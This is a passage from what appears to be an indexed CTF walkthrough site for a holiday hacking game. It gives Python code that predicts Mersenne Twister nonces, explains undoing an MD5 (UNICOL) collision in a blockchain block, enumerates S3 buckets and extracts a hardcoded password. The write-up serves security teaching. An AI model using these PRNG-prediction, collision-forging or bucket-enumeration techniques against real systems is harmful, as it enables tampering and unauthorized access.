read ()) c2 = Chain ( load = True , filename = 'blockchain.dat' ) print ( 'C2: Block chain verify: %s ' % ( c2 . verify_chain ( official_public_key ))) print ( len ( c2 . blocks )) # create our own version of an MT19937 PRNG. myprng = mt19937 ( 0 ) y = 0 #feed 624 Nonces to the Mersenne Twister predictor for i in range ( 0 , mt19937 . n , 2 ): hexNonce = hex ( c2 . blocks [ y ] . nonce ) . split ( 'x' )[ - 1 ] MSB , LSB = SplitNonces ( hexNonce ) myprng . MT [ i ] = untemper ( ToDec ( LSB )) myprng . MT [ i + 1 ] = untemper ( ToDec ( MSB )) y = y + 1 ; #generate the Nonces for the existing blocks for i in range ( y , len ( c2 . blocks )): hexNonce = hex ( c2 . blocks [ i ] . nonce ) . split ( 'x' )[ - 1 ] MSB , LSB = SplitNonces ( hexNonce ) myprng . extract_number () myprng . extract_number () #print(c2.blocks[i].nonce, hexNonce,MSB,LSB, ToDec(MSB), ToDec(LSB), \"pred:\",myprng.extract_number(),myprng.extract_number()) #predict the next 8 Nonces for i in range ( 129997 , 130001 ): PredictNonce = MergeNonces ( ToHex ( myprng . extract_number ()), ToHex ( myprng . extract_number ())) print ( \"Predicted Nonce:\" , i , PredictNonce ) Running the updated naughty_nice.py gives you the following results: The updated naughty_nice.py code can be downloaded here . Answer \u00b6 The 130000 Nonce is 57066318f32f729d","title":"11a) Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"obj/objective11a/#objective-11a-naughtynice-list-with-blockchain-investigation-part-1","text":"","title":"Objective 11a - Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"obj/objective11a/#objective","text":"Link: tools Tinsel Upatree tells you the following: Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. You can get some tools to help you here. Tangle Coalbox, in the Speaker UNPreparedness room. has been talking with attendees about the issue. For this objective, you need to be Santa. Go to Santa's office and click on the Naughty/Nice List on the table next to Tinsel Upatree. This will download the blockchain that you need for this objective.","title":"Objective"},{"location":"obj/objective11a/#walk-through","text":"The terminal challenge for this objective is the \"Snowball fight\" that is offered by Tangle Coalbox in the UNPreparedness room. Solving this terminal challenge provide additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective go to the Santa's Office and Download the blockchain data , OfficialNaughtyNiceBlockchainEducationPack.zip and mt19937.py . There is a talk that may be helpful for this challenge. To solve this challenge you need to read the blocks in blockchain.dat and extract the Nonces from each block. You will then need to feed the first 624 Nonces to the Mersenne Twister predictor (ex. mt19937.py). This will allow you to predict nonces. You then need to step through the Nonces until you reach the 130000 th Nonce. To do this, extract OfficialNaughtyNiceBlockchainEducationPack.zip. Add mt19937.py to the naughty_nice.py script. Add the following functions to naughty_nice.py : def SplitNonces ( hexNonce ): LSB = hexNonce [ 8 :] MSB = hexNonce [: 8 ] return MSB , LSB def MergeNonces ( a , b ): return ( b + \"\" + a ) def ToDec ( hexNonce ): return int ( hexNonce , 16 ) def ToHex ( dec ): return hex ( dec ) . split ( 'x' )[ - 1 ] Update the main of naughty_nice.py as follow: if __name__ == '__main__' : with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = RSA . importKey ( fh . read ()) c2 = Chain ( load = True , filename = 'blockchain.dat' ) print ( 'C2: Block chain verify: %s ' % ( c2 . verify_chain ( official_public_key ))) print ( len ( c2 . blocks )) # create our own version of an MT19937 PRNG. myprng = mt19937 ( 0 ) y = 0 #feed 624 Nonces to the Mersenne Twister predictor for i in range ( 0 , mt19937 . n , 2 ): hexNonce = hex ( c2 . blocks [ y ] . nonce ) . split ( 'x' )[ - 1 ] MSB , LSB = SplitNonces ( hexNonce ) myprng . MT [ i ] = untemper ( ToDec ( LSB )) myprng . MT [ i + 1 ] = untemper ( ToDec ( MSB )) y = y + 1 ; #generate the Nonces for the existing blocks for i in range ( y , len ( c2 . blocks )): hexNonce = hex ( c2 . blocks [ i ] . nonce ) . split ( 'x' )[ - 1 ] MSB , LSB = SplitNonces ( hexNonce ) myprng . extract_number () myprng . extract_number () #print(c2.blocks[i].nonce, hexNonce,MSB,LSB, ToDec(MSB), ToDec(LSB), \"pred:\",myprng.extract_number(),myprng.extract_number()) #predict the next 8 Nonces for i in range ( 129997 , 130001 ): PredictNonce = MergeNonces ( ToHex ( myprng . extract_number ()), ToHex ( myprng . extract_number ())) print ( \"Predicted Nonce:\" , i , PredictNonce ) Running the updated naughty_nice.py gives you the following results: The updated naughty_nice.py code can be downloaded here .","title":"Walk-through"},{"location":"obj/objective11a/#answer","text":"The 130000 Nonce is 57066318f32f729d","title":"Answer"},{"location":"obj/objective11b/","text":"Objective 11b - Naughty/Nice List with Blockchain Investigation Part 2 \u00b6 Objective \u00b6 Tinsel Upatree tells you the following after you solve Objective 11a: Wow, it really was all about abusing the pseudo-random sequence! I've been thinking, do you think someone could try and cheat the Naughty/Nice Blockchain with this same technique? I remember you told us about how if you have control over to bytes in a file, it's easy to create MD5 hash collisions . But the nonce would have to be known ahead of time. We know that the blockchain works by \"chaining\" blocks together. There's no way you know who could change it without messing up the chain, right Santa? I'm going to look closer to spot if any of the blocks have been changed. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. I think I need to review my (Human Behavior Naughty/Niceness)[ https://www.youtube.com/watch?v=7rLMl88p-ec ] curriculum again. Walk-through \u00b6 The terminal challenge for this objective is the \"Snowball fight\" that is offered by Tangle Coalbox in the UNPreparedness room. This is the same terminal challenge as objective 11a. Solving this terminal challenge provide additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective, go to Santa's Office and Download the blockchain data and OfficialNaughtyNiceBlockchainEducationPack.zip . There is a talk that may be helpful for this challenge. To solve this challenge you need to read the blockchain, blockchain.dat , and find the block that Jack has altered. You know the SHA256 for this block is 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f . You need to iterate through the blocks until you find a block that has the correct SHA256 hash. Once you find this block, dump the documents attached to the block and the block itself into separate files. From the hints, we know Jack has altered a total of 4 Bytes in the block. From analyses of these files, we can find the 4 bytes that Jack has altered. You then need to modify these four bytes to their original value and save the new block. Calculate the SHA256 of this new block to solve the objective. Finding the modified block \u00b6 Extract OfficialNaughtyNiceBlockchainEducationPack.zip to a new folder. Update the Block() class in the naughty_nice.py script by adding the following: #new function to calculate Hash of the block def hash_block ( self ): hash_obj = MD5 . new () hash_obj . update ( self . block_data ()) return hash_obj . hexdigest () #new function to calculate SHA256 Hash of the block def hash_SHA256_block ( self ): hash_obj = SHA256 . new () hash_obj . update ( self . block_data ()) return hash_obj . hexdigest () The above functions will calculate the MD5 and SHA256 hash of a block. Update the main in naughty_nice.py as follow: if __name__ == '__main__' : # Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = RSA . importKey ( fh . read ()) c2 = Chain ( load = True , filename = 'blockchain.dat' ) print ( 'C2: Block chain verify: %s ' % ( c2 . verify_chain ( official_public_key ))) print ( len ( c2 . blocks )) i = 0 targetBlock_SHA256 = \"58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f\" for i in range ( len ( c2 . blocks )): if ( c2 . blocks [ i ] . full_hash_SHA256 () == targetBlock_SHA256 ): print ( \"Matched Blocked\" , i , \":\" ) print ( c2 . blocks [ i ]) print ( \"Block [\" , c2 . blocks [ i ] . index , \"].index:\" , c2 . blocks [ i ] . index ) print ( \"Block [\" , c2 . blocks [ i ] . index , \"].hash:\" , c2 . blocks [ i ] . hash ) print ( \"Block [\" , c2 . blocks [ i ] . index , \"] Calculated Hash (MD5)\" , c2 . blocks [ i ] . hash_block ()) print ( \"Block [\" , c2 . blocks [ i ] . index , \"] Calculated Hash (SHA256)\" , c2 . blocks [ i ] . hash_SHA256_block ()) print ( \"Block [\" , c2 . blocks [ i ] . index , \"].previous_hash\" , c2 . blocks [ i ] . previous_hash ) print ( \"Block [\" , c2 . blocks [ i ] . index , \"] signed Hash(MD5)\" , c2 . blocks [ i ] . full_hash ()) print ( \"Block [\" , c2 . blocks [ i ] . index , \"] signed Hash (SHA256)\" , c2 . blocks [ i ] . full_hash_SHA256 ()) print ( \"===========\" ) print ( c2 . blocks [ i ]) print ( \"===========\" ) for y in range ( 1 , c2 . blocks [ i ] . doc_count + 1 ): c2 . blocks [ i ] . dump_doc ( y ) # save a block before and after for comparison c2 . save_a_block ( i - 1 ) c2 . save_a_block ( i ) c2 . save_a_block ( i + 1 ) # save a block before and after for comparison print ( c2 . blocks [ i - 1 ]) print ( c2 . blocks [ i ]) print ( c2 . blocks [ i + 1 ]) hash_md5 = MD5 . new () hash_sha256 = SHA256 . new () with open ( \"block1010.dat\" , \"rb\" ) as f : for chunk in iter ( lambda : f . read ( 4096 ), b \"\" ): hash_md5 . update ( chunk ) hash_sha256 . update ( chunk ) print ( \"block1010.dat(md5):\" , hash_md5 . hexdigest ()) print ( \"block1010.dat(sha256):\" , hash_sha256 . hexdigest ()) The above code will do the following: Load the blockchain 'blockchain.dat'. Keep iterating through the blocks until you find the block with the SHA256 '58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f' Once found, write the block, the previous, and proceeding blocks to files. Dump all the attachments for the matched block. Run naughty_nice.py to find the altered block. Partial results are shown below: Finding the modified \"bytes\" \u00b6 From the above screenshot, you can see the altered block is the block 129459 which has the correct SHA256 Hash. This block has two attachments. This block shows that the individual was 1 (Nice) with the maximum score for FFFFFFFF . A good assumption is that Jack is likely \"naughty\", which means one of the changed bytes is the nice/naughty \"sign\". One of the attachments to block 129459 is a \".pdf\" file ( Virustotal ). This attachment corroborates the story that Jack is very nice. So if our first assumption is correct, Jack somehow must have changed the whole content of the PDF file. PDF files are documents that have tree structures. Here is an example of what a logical structure of a typical document looks like. Open the PDF file in a text editor and examine the objects. You can see that there are two trees in the document. One tree starts at object 2 and the other at object 3. The current catalogue points to object 2 (tree). Change this byte from 2 to 3 to point to object 3 (tree). Reopening the PDF file reveals the content of the PDF has changed to a different document. This document portrays Jack as being naughty. Here Original PDF attached to the blockchain and Fixed PDF . Changing the bytes back \u00b6 To figure this out on your own, read the hints, review the slides , watch the talk for this objective. You need a basic understanding of Hash collision and specifically UNICOL. One of the most useful slides that explain what UNICOL is doing is the following: UNICOL is adding 1 to the 10 th CHAR of the PREFIX and removing 1 from the 10 th CHAR of the 2 nd Block. This keeps the MD5 hash of the original and new blocks to be identical. It just happens that both the modified bytes are on the 10 th Byte of the 64K Blocks. To undo what UNICOL does, we need to subtract 1 from the PREFIX and add one to the 10 th CHAR of the second block. Open the block1010.dat in a hexeditor and change the 4 bytes back. Here is a screenshot that shows the changing of the first two bytes. The sign \"nice\" is changed to \"naughty\". The corresponding 10 th CHAR of the second block is also changed. Here is a screenshot that shows the changing of the second two bytes. The catalogue is changed from object 2 to 3. The corresponding 10 th CHAR of the second block is also changed. Save the modified block as \"blockchain.dat_2\" Finding the SHA256 of the \"original block\" \u00b6 Once you fix the modified bytes, you save the block as \"block1010.dat_2\". Add this code to the end of naughty_nice.py to calculate the SHA256 of the \"original\" block. hash_md5 = MD5 . new () hash_sha256 = SHA256 . new () with open ( \"block1010_2.dat\" , \"rb\" ) as f : for chunk in iter ( lambda : f . read ( 4096 ), b \"\" ): hash_md5 . update ( chunk ) hash_sha256 . update ( chunk ) print ( \"block1010.dat_2:\" , hash_md5 . hexdigest ()) print ( \"block1010.dat_2(sha256):\" , hash_sha256 . hexdigest ()) Here is a screenshot that shows the MD5 and SHA256 of the two blocks. You can see they both have the same MD5 hash but different SHA256 hashes. The updated naughty_nice.py code can be downloaded here . After you solve the challenge, you need to go to Santa's office (as \"Santa\") and talk to the different elves. Here is what happens if you go to the office without the \"Santa\" skin. Change to Santa and go back to finish the game. Eve Snowshoes: What a fantabulous job! Congratulations! What a fantabulous job! Congratulations! You MUST let us know how you did it! Feel free to show off your skills with some swag - only for our victors! Santa: Thank you for foiling Jack\u2019s foul plot! He sent that magical portrait so he could become me and destroy the holidays! Due to your incredible work, you have set everything right and saved the holiday season! Congratulations on a job well done! Ho Ho Ho! Answer \u00b6 The SHA256 of the original block is: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"11b) Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"obj/objective11b/#objective-11b-naughtynice-list-with-blockchain-investigation-part-2","text":"","title":"Objective 11b - Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"obj/objective11b/#objective","text":"Tinsel Upatree tells you the following after you solve Objective 11a: Wow, it really was all about abusing the pseudo-random sequence! I've been thinking, do you think someone could try and cheat the Naughty/Nice Blockchain with this same technique? I remember you told us about how if you have control over to bytes in a file, it's easy to create MD5 hash collisions . But the nonce would have to be known ahead of time. We know that the blockchain works by \"chaining\" blocks together. There's no way you know who could change it without messing up the chain, right Santa? I'm going to look closer to spot if any of the blocks have been changed. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. I think I need to review my (Human Behavior Naughty/Niceness)[ https://www.youtube.com/watch?v=7rLMl88p-ec ] curriculum again.","title":"Objective"},{"location":"obj/objective11b/#walk-through","text":"The terminal challenge for this objective is the \"Snowball fight\" that is offered by Tangle Coalbox in the UNPreparedness room. This is the same terminal challenge as objective 11a. Solving this terminal challenge provide additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective, go to Santa's Office and Download the blockchain data and OfficialNaughtyNiceBlockchainEducationPack.zip . There is a talk that may be helpful for this challenge. To solve this challenge you need to read the blockchain, blockchain.dat , and find the block that Jack has altered. You know the SHA256 for this block is 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f . You need to iterate through the blocks until you find a block that has the correct SHA256 hash. Once you find this block, dump the documents attached to the block and the block itself into separate files. From the hints, we know Jack has altered a total of 4 Bytes in the block. From analyses of these files, we can find the 4 bytes that Jack has altered. You then need to modify these four bytes to their original value and save the new block. Calculate the SHA256 of this new block to solve the objective.","title":"Walk-through"},{"location":"obj/objective11b/#finding-the-modified-block","text":"Extract OfficialNaughtyNiceBlockchainEducationPack.zip to a new folder. Update the Block() class in the naughty_nice.py script by adding the following: #new function to calculate Hash of the block def hash_block ( self ): hash_obj = MD5 . new () hash_obj . update ( self . block_data ()) return hash_obj . hexdigest () #new function to calculate SHA256 Hash of the block def hash_SHA256_block ( self ): hash_obj = SHA256 . new () hash_obj . update ( self . block_data ()) return hash_obj . hexdigest () The above functions will calculate the MD5 and SHA256 hash of a block. Update the main in naughty_nice.py as follow: if __name__ == '__main__' : # Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat with open ( 'official_public.pem' , 'rb' ) as fh : official_public_key = RSA . importKey ( fh . read ()) c2 = Chain ( load = True , filename = 'blockchain.dat' ) print ( 'C2: Block chain verify: %s ' % ( c2 . verify_chain ( official_public_key ))) print ( len ( c2 . blocks )) i = 0 targetBlock_SHA256 = \"58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f\" for i in range ( len ( c2 . blocks )): if ( c2 . blocks [ i ] . full_hash_SHA256 () == targetBlock_SHA256 ): print ( \"Matched Blocked\" , i , \":\" ) print ( c2 . blocks [ i ]) print ( \"Block [\" , c2 . blocks [ i ] . index , \"].index:\" , c2 . blocks [ i ] . index ) print ( \"Block [\" , c2 . blocks [ i ] . index , \"].hash:\" , c2 . blocks [ i ] . hash ) print ( \"Block [\" , c2 . blocks [ i ] . index , \"] Calculated Hash (MD5)\" , c2 . blocks [ i ] . hash_block ()) print ( \"Block [\" , c2 . blocks [ i ] . index , \"] Calculated Hash (SHA256)\" , c2 . blocks [ i ] . hash_SHA256_block ()) print ( \"Block [\" , c2 . blocks [ i ] . index , \"].previous_hash\" , c2 . blocks [ i ] . previous_hash ) print ( \"Block [\" , c2 . blocks [ i ] . index , \"] signed Hash(MD5)\" , c2 . blocks [ i ] . full_hash ()) print ( \"Block [\" , c2 . blocks [ i ] . index , \"] signed Hash (SHA256)\" , c2 . blocks [ i ] . full_hash_SHA256 ()) print ( \"===========\" ) print ( c2 . blocks [ i ]) print ( \"===========\" ) for y in range ( 1 , c2 . blocks [ i ] . doc_count + 1 ): c2 . blocks [ i ] . dump_doc ( y ) # save a block before and after for comparison c2 . save_a_block ( i - 1 ) c2 . save_a_block ( i ) c2 . save_a_block ( i + 1 ) # save a block before and after for comparison print ( c2 . blocks [ i - 1 ]) print ( c2 . blocks [ i ]) print ( c2 . blocks [ i + 1 ]) hash_md5 = MD5 . new () hash_sha256 = SHA256 . new () with open ( \"block1010.dat\" , \"rb\" ) as f : for chunk in iter ( lambda : f . read ( 4096 ), b \"\" ): hash_md5 . update ( chunk ) hash_sha256 . update ( chunk ) print ( \"block1010.dat(md5):\" , hash_md5 . hexdigest ()) print ( \"block1010.dat(sha256):\" , hash_sha256 . hexdigest ()) The above code will do the following: Load the blockchain 'blockchain.dat'. Keep iterating through the blocks until you find the block with the SHA256 '58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f' Once found, write the block, the previous, and proceeding blocks to files. Dump all the attachments for the matched block. Run naughty_nice.py to find the altered block. Partial results are shown below:","title":"Finding the modified block"},{"location":"obj/objective11b/#finding-the-modified-bytes","text":"From the above screenshot, you can see the altered block is the block 129459 which has the correct SHA256 Hash. This block has two attachments. This block shows that the individual was 1 (Nice) with the maximum score for FFFFFFFF . A good assumption is that Jack is likely \"naughty\", which means one of the changed bytes is the nice/naughty \"sign\". One of the attachments to block 129459 is a \".pdf\" file ( Virustotal ). This attachment corroborates the story that Jack is very nice. So if our first assumption is correct, Jack somehow must have changed the whole content of the PDF file. PDF files are documents that have tree structures. Here is an example of what a logical structure of a typical document looks like. Open the PDF file in a text editor and examine the objects. You can see that there are two trees in the document. One tree starts at object 2 and the other at object 3. The current catalogue points to object 2 (tree). Change this byte from 2 to 3 to point to object 3 (tree). Reopening the PDF file reveals the content of the PDF has changed to a different document. This document portrays Jack as being naughty. Here Original PDF attached to the blockchain and Fixed PDF .","title":"Finding the modified \"bytes\""},{"location":"obj/objective11b/#changing-the-bytes-back","text":"To figure this out on your own, read the hints, review the slides , watch the talk for this objective. You need a basic understanding of Hash collision and specifically UNICOL. One of the most useful slides that explain what UNICOL is doing is the following: UNICOL is adding 1 to the 10 th CHAR of the PREFIX and removing 1 from the 10 th CHAR of the 2 nd Block. This keeps the MD5 hash of the original and new blocks to be identical. It just happens that both the modified bytes are on the 10 th Byte of the 64K Blocks. To undo what UNICOL does, we need to subtract 1 from the PREFIX and add one to the 10 th CHAR of the second block. Open the block1010.dat in a hexeditor and change the 4 bytes back. Here is a screenshot that shows the changing of the first two bytes. The sign \"nice\" is changed to \"naughty\". The corresponding 10 th CHAR of the second block is also changed. Here is a screenshot that shows the changing of the second two bytes. The catalogue is changed from object 2 to 3. The corresponding 10 th CHAR of the second block is also changed. Save the modified block as \"blockchain.dat_2\"","title":"Changing the bytes back"},{"location":"obj/objective11b/#finding-the-sha256-of-the-original-block","text":"Once you fix the modified bytes, you save the block as \"block1010.dat_2\". Add this code to the end of naughty_nice.py to calculate the SHA256 of the \"original\" block. hash_md5 = MD5 . new () hash_sha256 = SHA256 . new () with open ( \"block1010_2.dat\" , \"rb\" ) as f : for chunk in iter ( lambda : f . read ( 4096 ), b \"\" ): hash_md5 . update ( chunk ) hash_sha256 . update ( chunk ) print ( \"block1010.dat_2:\" , hash_md5 . hexdigest ()) print ( \"block1010.dat_2(sha256):\" , hash_sha256 . hexdigest ()) Here is a screenshot that shows the MD5 and SHA256 of the two blocks. You can see they both have the same MD5 hash but different SHA256 hashes. The updated naughty_nice.py code can be downloaded here . After you solve the challenge, you need to go to Santa's office (as \"Santa\") and talk to the different elves. Here is what happens if you go to the office without the \"Santa\" skin. Change to Santa and go back to finish the game. Eve Snowshoes: What a fantabulous job! Congratulations! What a fantabulous job! Congratulations! You MUST let us know how you did it! Feel free to show off your skills with some swag - only for our victors! Santa: Thank you for foiling Jack\u2019s foul plot! He sent that magical portrait so he could become me and destroy the holidays! Due to your incredible work, you have set everything right and saved the holiday season! Congratulations on a job well done! Ho Ho Ho!","title":"Finding the SHA256 of the \"original block\""},{"location":"obj/objective11b/#answer","text":"The SHA256 of the original block is: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Answer"},{"location":"obj/objective2/","text":"Objective 2 - Investigate S3 Bucket \u00b6 Objective \u00b6 After solving Objective 1, take a ride on the gondola to travel the north pole. On the \"Front Lawn\" of Santa's Castle, you will find Shinny Upatree. Walk-through \u00b6 The terminal challenge for this objective is the \"Kringle Kiosk\". Solving this terminal challenge provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective, click on the \"Investigate S3 Bucket\" next to Shinny Upatree. A console will popup. From the Hints Shinny provides after solving the \"Kringle Kiosk\" Terminal Challenge, you know that you can use the bucket_finder.rb with a custom dictionary to find the unprotected bucket. There are additional tips provided in the TIPS file that can be viewed (eg. cat TIPS ): There are a few words in the console welcome screen that are in color. You need to update the wordlist with these words. You can use nano or vim to edit the list (eg. nano wordlist ). Run the bucket_finder.rb with the following syntax: ./bucket_finder.rb wordlist --download This command will download a file with the name package from wrapper3000 bucket. Using the command line file package you can identify the file as an ASCII file. Using the command line cat package you can see the content of this file: This ASCII file is encoded in Base64. You can decode this text using CyberChef . CyberChef's Output: Based on the above output header, PK , the Base64 string is a .zip file. The decoded string shows the filename as package.txt.Z.xz.xxd.tar.bz2 . Use the following command to decode the package Base64 file: base64 package -d > package.txt.Z.xz.xxd.tar.bz2.zip Now you have a .tar.bz2 file. Use the following command to decompress this file: tar xjf package.txt.Z.xz.xxd.tar.bz2 Now you have a .xxd file. Use the following command to reverse this file: xxd -r package.txt.Z.xz.xxd > package.txt.Z.xz Now you have a .xz file. Use the following command to decompress this file: unxz package.txt.Z.xz Now you have a .Z file. Use the following command to decompress this file: uncompress package.txt.Z Now you have a package.txt file that can be read (eg. cat package.txt ). Answer \u00b6 When you unwrap the over-wrapped file you see the following string inside the package North Pole: The Frostiest Place on Earth .","title":"2) Investigate S3 Bucket"},{"location":"obj/objective2/#objective-2-investigate-s3-bucket","text":"","title":"Objective 2 - Investigate S3 Bucket"},{"location":"obj/objective2/#objective","text":"After solving Objective 1, take a ride on the gondola to travel the north pole. On the \"Front Lawn\" of Santa's Castle, you will find Shinny Upatree.","title":"Objective"},{"location":"obj/objective2/#walk-through","text":"The terminal challenge for this objective is the \"Kringle Kiosk\". Solving this terminal challenge provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective, click on the \"Investigate S3 Bucket\" next to Shinny Upatree. A console will popup. From the Hints Shinny provides after solving the \"Kringle Kiosk\" Terminal Challenge, you know that you can use the bucket_finder.rb with a custom dictionary to find the unprotected bucket. There are additional tips provided in the TIPS file that can be viewed (eg. cat TIPS ): There are a few words in the console welcome screen that are in color. You need to update the wordlist with these words. You can use nano or vim to edit the list (eg. nano wordlist ). Run the bucket_finder.rb with the following syntax: ./bucket_finder.rb wordlist --download This command will download a file with the name package from wrapper3000 bucket. Using the command line file package you can identify the file as an ASCII file. Using the command line cat package you can see the content of this file: This ASCII file is encoded in Base64. You can decode this text using CyberChef . CyberChef's Output: Based on the above output header, PK , the Base64 string is a .zip file. The decoded string shows the filename as package.txt.Z.xz.xxd.tar.bz2 . Use the following command to decode the package Base64 file: base64 package -d > package.txt.Z.xz.xxd.tar.bz2.zip Now you have a .tar.bz2 file. Use the following command to decompress this file: tar xjf package.txt.Z.xz.xxd.tar.bz2 Now you have a .xxd file. Use the following command to reverse this file: xxd -r package.txt.Z.xz.xxd > package.txt.Z.xz Now you have a .xz file. Use the following command to decompress this file: unxz package.txt.Z.xz Now you have a .Z file. Use the following command to decompress this file: uncompress package.txt.Z Now you have a package.txt file that can be read (eg. cat package.txt ).","title":"Walk-through"},{"location":"obj/objective2/#answer","text":"When you unwrap the over-wrapped file you see the following string inside the package North Pole: The Frostiest Place on Earth .","title":"Answer"},{"location":"obj/objective3/","text":"Objective 3 - Point-of-Sale Password Recovery \u00b6 Objective \u00b6 In the \"Courtyard\" of Santa's Castle, you will find Sugarplum Mary. Sugarplum Mary is standing next to the \"Santa shop\" Objective and terminal \"Linux Primer\". Walk-through \u00b6 The terminal challenge for this objective is the \"Linux Primer\". Solving this terminal challenge provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective click on the \"Santa Shop\". A console will popup, which allows you to download an offline version of the Point-of-Sale software to inspect. Use 7-zip software to extract the downloaded installation file. Inside \"$PLUGINSDIR\" there is a app-64.7z file that is compressed. Extract this file using 7-zip software. Examine the extracted contents of this file. There is a file called app.asar located inside the app-64/resources/ folder. Open this file an editor of your choice and search for password . Answer \u00b6 The supervisor password for the point-of-sale terminal is santapass .","title":"3) Point-of-Sale Password Recovery"},{"location":"obj/objective3/#objective-3-point-of-sale-password-recovery","text":"","title":"Objective 3 - Point-of-Sale Password Recovery"},{"location":"obj/objective3/#objective","text":"In the \"Courtyard\" of Santa's Castle, you will find Sugarplum Mary. Sugarplum Mary is standing next to the \"Santa shop\" Objective and terminal \"Linux Primer\".","title":"Objective"},{"location":"obj/objective3/#walk-through","text":"The terminal challenge for this objective is the \"Linux Primer\". Solving this terminal challenge provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective click on the \"Santa Shop\". A console will popup, which allows you to download an offline version of the Point-of-Sale software to inspect. Use 7-zip software to extract the downloaded installation file. Inside \"$PLUGINSDIR\" there is a app-64.7z file that is compressed. Extract this file using 7-zip software. Examine the extracted contents of this file. There is a file called app.asar located inside the app-64/resources/ folder. Open this file an editor of your choice and search for password .","title":"Walk-through"},{"location":"obj/objective3/#answer","text":"The supervisor password for the point-of-sale terminal is santapass .","title":"Answer"},{"location":"obj/objective4/","text":"Objective 4 - Operate the Santavator \u00b6 Objective \u00b6 On the \"Front Lawn\" of Santa's Castle, you will find Pepper Minstix. Pepper Minstix is standing next to the \"Unescape Tmux\" terminal. The Santavator for this challenge is located in the \"entry\" of Santa's Castle on the right. Walk-through \u00b6 The terminal challenge for this objective is the \"Unescape Tmux\". Solving this terminal challenge provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective talk to Sparkle Redberry. She will give you a Elevator Service Key that you will need for this challenge. This key opens the Santavator's panel. Using the hint we received from Pepper Minstix, we know we need to explore the castle to find various items. Explore the castle until you find the following items: Item Location Green Bulb Courtyard (top left) Hex Bolt Dining Room Hex Bolt Entryway by Elevator Broken Candycane Front Lawn (near the passage to Entry) Open the panel, by click on the key on the bottom right. Use these items to deflect the magical particle to the green pipe. Based on the guide on the bottom right in the panel, this give you access to the \"Talks\" level. Once you configured the panel as above, you will have access to the \"Talks\" level. You need to find the red, yellow bulbs and the 1.5 elevator button to fully fix the panel. The Red Bulb is located on the \"Talks\" Level Lobby near Chimney Scissorsticks. Configure the panel as such to get access to the roof. The Yellow Bulb is located on the \"Netwars level\" (the roof) near Wunorse Openslae. Configure the panel as such to fully power it. Here is how the closed panel looks: The final Elevator 1.5 Button is in the \"Speaker Unprep\" room. You need to solve another challenge to access this room. This button is not required to complete this objective. Answer \u00b6 Here is a table that shows the location of all the items required for solving the Santavator: Item Location Elevator Service Key Sparkle Redberry Green Bulb Courtyard (top left) Hex Bolt Dining Room Hex Bolt Entryway by Elevator Broken Candycane Front Lawn (near the passage to Entry) Red Bulb Talks Level Lobby near Chimney Scissorsticks Yellow Bulb Netwars level near Wunorse Openslae Configure the panel as such to fully power it.","title":"4) Operate the Santavator"},{"location":"obj/objective4/#objective-4-operate-the-santavator","text":"","title":"Objective 4 - Operate the Santavator"},{"location":"obj/objective4/#objective","text":"On the \"Front Lawn\" of Santa's Castle, you will find Pepper Minstix. Pepper Minstix is standing next to the \"Unescape Tmux\" terminal. The Santavator for this challenge is located in the \"entry\" of Santa's Castle on the right.","title":"Objective"},{"location":"obj/objective4/#walk-through","text":"The terminal challenge for this objective is the \"Unescape Tmux\". Solving this terminal challenge provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective talk to Sparkle Redberry. She will give you a Elevator Service Key that you will need for this challenge. This key opens the Santavator's panel. Using the hint we received from Pepper Minstix, we know we need to explore the castle to find various items. Explore the castle until you find the following items: Item Location Green Bulb Courtyard (top left) Hex Bolt Dining Room Hex Bolt Entryway by Elevator Broken Candycane Front Lawn (near the passage to Entry) Open the panel, by click on the key on the bottom right. Use these items to deflect the magical particle to the green pipe. Based on the guide on the bottom right in the panel, this give you access to the \"Talks\" level. Once you configured the panel as above, you will have access to the \"Talks\" level. You need to find the red, yellow bulbs and the 1.5 elevator button to fully fix the panel. The Red Bulb is located on the \"Talks\" Level Lobby near Chimney Scissorsticks. Configure the panel as such to get access to the roof. The Yellow Bulb is 